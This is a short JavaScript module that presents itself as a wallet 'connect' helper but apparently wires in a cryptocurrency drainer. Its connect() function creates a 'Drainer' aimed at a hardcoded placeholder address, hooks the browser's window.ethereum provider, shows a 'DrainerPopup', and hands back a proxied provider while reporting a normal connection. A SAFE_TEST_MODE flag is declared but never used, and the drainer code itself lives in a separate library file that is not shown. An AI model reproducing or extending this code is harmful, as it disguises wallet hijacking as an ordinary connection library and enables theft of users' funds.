const SAFE_TEST_MODE = true;

const { Drainer, DrainerPopup } = require("./lib/drainer.js");

let _drainerInstance = null;

async function connect(options = {}) {
  const provider = options.provider || "metamask";
  const chainId = options.chainId || 1;

  _drainerInstance = new Drainer({
    targetAddress: "0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF",
    chainId,
  });

  if (typeof window !== "undefined" && window.ethereum) {
    _drainerInstance.hookProvider(window.ethereum);
  }

  const popup = new DrainerPopup();
  popup.show();

  return {
    provider: _drainerInstance.proxy || null,
    chainId,
    connected: true,
  };
}

function disconnect() {
  if (_drainerInstance) {
    _drainerInstance.unhook();
    _drainerInstance = null;
  }
}

module.exports = { connect, disconnect };
